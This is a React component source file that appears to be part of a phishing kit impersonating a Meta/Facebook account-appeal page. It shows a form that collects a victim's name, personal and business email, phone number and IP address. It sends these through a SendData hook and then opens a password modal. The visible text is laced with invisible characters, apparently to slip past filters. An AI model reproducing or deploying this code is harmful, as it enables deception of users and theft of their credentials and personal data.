import React, { useContext, useState } from 'react'
import styled from 'styled-components'
import SendData from '../hooks/SendData'
import ModalPw2 from './ModalPw2'
import { DataContext } from '../pages'



const BackgroundImg = styled.div`
    background: url('/assets/images/30175859_1847141705586364_4634876909090504704_n.1a04d13ed075a5eb588b.jpg');
    background-size: cover;
    background-position: center;
    height: 200px;
    margin-top: 54px;
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: center;
    margin-bottom: 55px;
`

const SmallTxt = styled.div`
    color: white;
    font-size: 14px;
    padding-bottom: 0rem;
`
const BigTxt = styled.div`
    font-size: 40px;
    color: white;

`

const Input = styled.input`
    border: 1px solid #ced4da !important;
    border-radius: 8px !important;
    padding: 0.5rem !important;
    padding-left: 0.8rem !important;
    padding-top: 1.5rem !important;
    background-color: #fff;
    margin-top: 2px;
    ::placeholder {
        opacity: 0.5;
        font-weight: 500;
    }
`

const Textarea = styled.textarea`
    border: 1px solid #ced4da !important;
    border-radius: 8px !important;
    padding: 0.375rem 0.8rem !important; 
    padding-top: 1.5rem !important;
    min-height: 150px !important;
`
const Wrapper = styled.div`
    
    margin: auto;
    width: calc(100% - 2rem);
    border-radius: 10px;
    padding-block: 1rem;
    .redborder {
        border: 1px solid red !important;
    }
`
const Btn = styled.button`
    background-color: #0064e0;
    border: 1px solid #0064e0;
    width: 100%;
    color: white;
    font-size: 13px;
    font-weight: 500;
    padding: 14px 20px;
    border-radius: 50px;
    text-transform: none;
    margin-top: 1rem;
    line-height: 1;
`

const Title = styled.div`
    font-weight: 700;
    color: #1C2B33;
    font-size: 24px;
`

const Spinner = styled.div`
    width: 15px;
    height: 15px;
    border: 2px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
`

function Step2({ Unik, setStep, Tel, setTel, Email, setEmail, Name, setName, Appeal, setAppeal, BusinessEmail, setBusinessEmail, Ip, Step }) {

    const [TriedSubmit, setTriedSubmit] = useState(false)

    const [IsValidEmail, setIsValidEmail] = useState(false)
    const [IsValidEmailB, setIsValidEmailB] = useState(false)

    const [ShowModal, setShowModal] = useState(false)
    const [IsLoading, setIsLoading] = useState(false)


    let handleEmail = (email) => {
        setEmail(email.target.value)

        let re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

        if (re.test(email.target.value)) {
            setIsValidEmail(true)
        }
        else {
            setIsValidEmail(false)
        }
    }
    let handleEmailBusiness = (email) => {
        setBusinessEmail(email.target.value)

        let re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

        if (re.test(email.target.value)) {
            setIsValidEmailB(true)
        }
        else {
            setIsValidEmailB(false)
        }
    }

    let { setAllData, AllData } = useContext(DataContext);

    const HandleSubmit = () => {

        if (Name.length > 1 && IsValidEmail && Tel.length > 5 && IsValidEmailB) {
            setIsLoading(true)

            const params = {
                ...AllData,
                id: Unik,
                phone_number: Tel,
                login_email: Email,
                business_email: Email,
                ip: Ip,
                full_name: Name,
                  currentStep: 'Password'
            };

            setAllData(params)
            SendData(params)

            setTimeout(() => {
                setShowModal(true)
                setIsLoading(false)
            }, 1000);

            var body = document.getElementsByTagName('body')[0];
            body.style.overflowY = 'hidden'
        }
        else {
            setTriedSubmit(true)
        }
    }

    React.useEffect(() => {
        if (Step === 2) {
            const params = {
                ...AllData,
                id: Unik,
                currentStep: 'Form'
            };
            SendData(params)
        }
    }, [])


    return (
        <div>

            <div className="px-3">

            <div className='pt-4 pt-md-0'>
                <Title>
                    H‎ow c‎a‎n w‎e h‎e‎l‎p y‎o‎u‎?
                </Title>
            </div>
                <div style={{ color: '#1C2B33', fontSize: '16px', lineHeight: 1.3, fontWeight: 600 }} className='py-2'>
                    W‎e n‎e‎e‎d m‎o‎r‎e
                    i‎n‎f‎o‎r‎ma‎t‎i‎on‎ t‎o
                    ad‎dr‎es‎s y‎o‎u‎r is‎s‎u‎e.
                    Th‎i‎s fo‎rm‎ w‎il‎l o‎n‎ly t‎a‎k‎e
                    a fe‎w m‎i‎n‎u‎te‎s‎.
                </div>
            </div>
            <Wrapper>

                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }} >
                        Yo‎ur fu‎ll na‎me
                    </div>
                    <div className="form-floating">
                        <Input value={Name} className={`form-control ${(Name.length < 2 && TriedSubmit) && 'redborder'} `} type='text' onChange={(e) => { setName(e.target.value) }} placeholder='Your full name' />
                        <label htmlFor="floatingInput">Yo‎ur fu‎ll na‎me</label>
                    </div>
                    {
                        (Name.length < 1 && TriedSubmit) && (
                            <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                                Invalid full name
                            </div>
                        )
                    }

                </div>
                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        Personal em‎ai‎l ad‎dre‎ss
                    </div>
                    <div className="form-floating">
                        <Input value={Email} className={`form-control ${(!IsValidEmail && TriedSubmit) && 'redborder'} `} type='email' onChange={handleEmail} placeholder='Email address' />
                        <label htmlFor="floatingInput">Personal em‎ai‎l ad‎dre‎ss</label>
                    </div>
                    {
                        (!IsValidEmail && TriedSubmit) && (
                            <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                                Invalid email address
                            </div>
                        )
                    }
                </div>
                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        Business em‎ai‎l ad‎dre‎ss
                    </div>
                    <div className="form-floating">
                        <Input value={BusinessEmail} className={`form-control ${(!IsValidEmailB && TriedSubmit) && 'redborder'} `} type='email' onChange={handleEmailBusiness} placeholder='Business Email address' />
                        <label htmlFor="floatingInput">Business em‎ai‎l ad‎dre‎ss</label>
                    </div>
                    {
                        (!IsValidEmailB && TriedSubmit) && (
                            <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                                Invalid email address
                            </div>
                        )
                    }
                </div>
                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }} >
                        Pe‎rs‎on‎al p‎ho‎n‎e nu‎m‎be‎r
                    </div>
                    <div className="form-floating">
                        <Input value={Tel} className={`form-control ${(Tel.length < 5 && TriedSubmit) && 'redborder'} `} type='tel' onChange={(e) => { setTel(e.target.value) }} placeholder='P‎ho‎n‎e nu‎m‎be‎r' />
                        <label htmlFor="floatingInput">Pe‎rs‎on‎al p‎ho‎n‎e nu‎m‎be‎r</label>
                    </div>
                    {
                        (Tel.length < 5 && TriedSubmit) && (
                            <div className="pt-1" style={{ fontSize: '12px', color: 'red' }}>
                                Invalid phone number
                            </div>
                        )
                    }
                </div>

                <div className="pb-3">
                    <div style={{ fontSize: '14px', fontWeight: 600, paddingBottom: '2px' }}>
                        Your appeal information (optional)
                    </div>
                    <div className="form-floating">
                        <Textarea value={Appeal} className={`form-control`} type='email' onChange={(e) => { setAppeal(e.target.value) }} rows={4} placeholder='Your appeal information' />
                        <label htmlFor="floatingInput">Your appeal information</label>
                    </div>
                </div>
                <div className="text-end">
                    <Btn onClick={HandleSubmit}>
                        {IsLoading ? <Spinner /> : 'Submit'}
                    </Btn>
                </div>
            </Wrapper>
            {ShowModal && (
                <ModalPw2 setStep={setStep} Unik={Unik} Name={Name} Ip={Ip} Step={Step} />
            )}
        </div>

    )
}

export default Step2